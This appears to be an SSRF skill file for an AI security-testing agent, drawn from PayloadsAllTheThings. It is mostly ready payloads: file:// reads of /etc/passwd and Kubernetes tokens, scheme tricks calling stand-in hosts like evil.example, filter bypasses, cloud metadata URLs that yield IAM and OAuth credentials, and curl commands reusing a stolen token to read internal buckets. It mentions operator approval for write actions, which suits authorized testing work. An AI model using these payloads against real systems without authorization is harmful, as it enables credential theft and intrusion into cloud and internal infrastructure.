---
description: URL schemas, IP bypass, cloud metadata (AWS/GCP/Azure)
skill: ssrf-testing
source: PayloadsAllTheThings — Server Side Request Forgery
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# SSRF (Server-Side Request Forgery) Payloads

> Source: PayloadsAllTheThings — Server Side Request Forgery

## URL Schema Tricks

```
file:///etc/passwd
file://\/\/etc/passwd
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>
dict://attacker:11111/
sftp://evil.example:11111/
tftp://evil.example:12346/TESTUDPPACKET
ldap://localhost:11211/%0astats%0aquit
netdoc:///etc/passwd
jar:http://127.0.0.1!/
```

## IP Address Bypass Techniques

### DNS Rebinding

```
http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
http://127.0.0.1.nip.io
http://localtest.me         -> resolves to 127.0.0.1
http://spoofed.burpcollaborator.net  -> DNS rebinding service
http://company.127.0.0.1.nip.io -> resolves to 127.0.0.1
```

Rebinding needs two separate resolutions (validate, then fetch) with no cache between them, and
it is a race: expect roughly one success in five attempts even when the stack allows it. It fails
when:

- the HTTP stack caches resolutions: Java `InetAddress` caches successful lookups for 30 s by
  default (`networkaddress.cache.ttl`), which closes the window; Python `requests` does not cache
  (better odds);
- the app resolves once and reuses the connection (keep-alive pools);
- the rebinding service answers with TTL > 0 and the resolver honours it (the first, allowed
  answer stays pinned).

## URL Parser Bypass

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

### PHP filter_var() Bypass

```
http://test???test.example
0://evil.example:80;http://google.com:80/
```

## Hostname-String Bypass (obfuscate an internal NAME)

When the guard is a host-string allow/block-list (not an IP check), the resolver still connects but the string match misses. Example name `imds` / `metadata.internal`:

```
http://IMDS./                          # upper-case (string check often case-sensitive)
http://Imds/                           # mixed case
http://imds./                          # trailing dot (FQDN root label)
http://metadata.internal./             # trailing dot on a multi-label name
http://%69%6d%64%73/                   # percent-encoded host bytes = "imds"
http://%6d%65%74%61%64%61%74%61.internal/   # percent-encoded "metadata"
```

For an allowlist keyed on an approved public domain, point that approved host (or your own 30x) at internal infra and let the fetcher follow the redirect.

## Conventional Internal Service Names

In container/compose/k8s deployments, internal services answer to DNS service names — not only loopback or metadata IPs. Enumerate these alongside the metadata IPs (`localhost`/`127.0.0.1` reaches only the app itself):

```
http://imds/            http://metadata/        http://metadata.internal/
http://store/           http://objstore/        http://s3/
http://db/              http://redis/           http://api/
# plus the deployment's own compose/k8s service name for the target backend
```

## Cloud Metadata Endpoints

### AWS (IMDSv1)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]

# ECS task role credentials (a different endpoint, often overlooked); the relative URI is in the
# task's environment, so read it first (file:///proc/self/environ, an env-dump endpoint, error pages)
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### GCP

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Header required: `Metadata-Flavor: Google`. A GET-only SSRF without header control cannot read it
unless CR/LF in the fetched URL or a forwarded header lets you inject the header into the outbound
request (`agent/skills/crlf-injection/SKILL.md`); the same trick supplies Azure's `Metadata: true`.

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Header required: `Metadata: true`

### Kubernetes / etcd

```
# service-account token, CA and namespace, readable wherever file:// is accepted
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
# API server, if network policy allows pod-to-API traffic (needs the token as Bearer)
https://kubernetes.default.svc/api/v1/namespaces
http://127.0.0.1:2379/v2/keys/
curl -s http://127.0.0.1:10255/pods
```

## User-Data / Startup-Script Breadcrumb Endpoints

The credential document may not name the next hop — user-data / metadata attributes do (internal object-store endpoint, bucket name, DB host). Always read these per cloud:

```
# AWS
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
# GCP (Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
# Azure (Metadata: true) — customData is base64
http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01
# DigitalOcean
http://169.254.169.254/metadata/v1/user-data
```

## Pivot: List Bucket, Then Read Object (forward the stolen token)

List FIRST to learn the key (discovery), THEN read the object (exfil). A store that 403s without the credential but serves with it confirms the chain:

```bash
# 1. LIST — discovery
curl -s -H "Authorization: Bearer $STOLEN_TOKEN" "http://objstore.internal/buckets/$BUCKET/"
# 2. READ the named object — attacker outcome
curl -s -H "Authorization: Bearer $STOLEN_TOKEN" "http://objstore.internal/buckets/$BUCKET/$KEY"
```

## Post-SSRF Services

Read-only reach proves impact; anything that writes (Redis `CONFIG SET`/`SLAVEOF`/`SAVE`, cron or
`authorized_keys` writes, Docker container create/start, CouchDB admin creation, Elasticsearch
scripts) changes target state and needs operator approval first (`agent/shared-constraints.md`
§1, §2d). Gopher needs a client that speaks it (curl/libcurl; not Python `requests`, Node
`axios` or Go `net/http`), and curl's default redirect protocols exclude gopher and file, so a
redirect to `gopher://` usually fails.

| Port | Service | Read-only proof |
|------|---------|-----------------|
| 6379 | Redis (often no auth) | `INFO`, `KEYS` sample via gopher |
| 9200 | Elasticsearch | `/_cat/indices?v`, a bounded `_search?size=1` |
| 2375/2376 | Docker API | `/containers/json`, `/info` |
| 10250/10255 | Kubelet | `/pods` |
| 8500 | Consul | `/v1/kv/?keys` |
| 5984 | CouchDB | `/_all_dbs` |
| 11211 | Memcached | `stats` via gopher |
| 9090 | Prometheus | `/api/v1/targets` (internal URLs, sometimes secrets) |
| 443 | Kubernetes API (`kubernetes.default.svc`) | with a stolen SA token, `/api/v1/namespaces/<ns>/secrets` list |
| 27017 | MongoDB (often no auth on internal networks) | connection banner / error shape via gopher or the error oracle |
| 3306 | MySQL (passwordless account) | gopher-built login + `SELECT version()` |
| 5432 | PostgreSQL (`trust` auth) | gopher-built startup message + `SELECT version()` |
| 25 | SMTP | gopher `EHLO` banner only; sending mail reaches humans (§2d) |
| 8080/8443 | Internal web apps | admin panels and monitoring dashboards: read the landing page |

Gopher payloads for MySQL, PostgreSQL, SMTP and Redis are byte-exact protocol frames (the handshake
for MySQL/PostgreSQL only works without a password challenge); build them with a small Python
script rather than by hand.
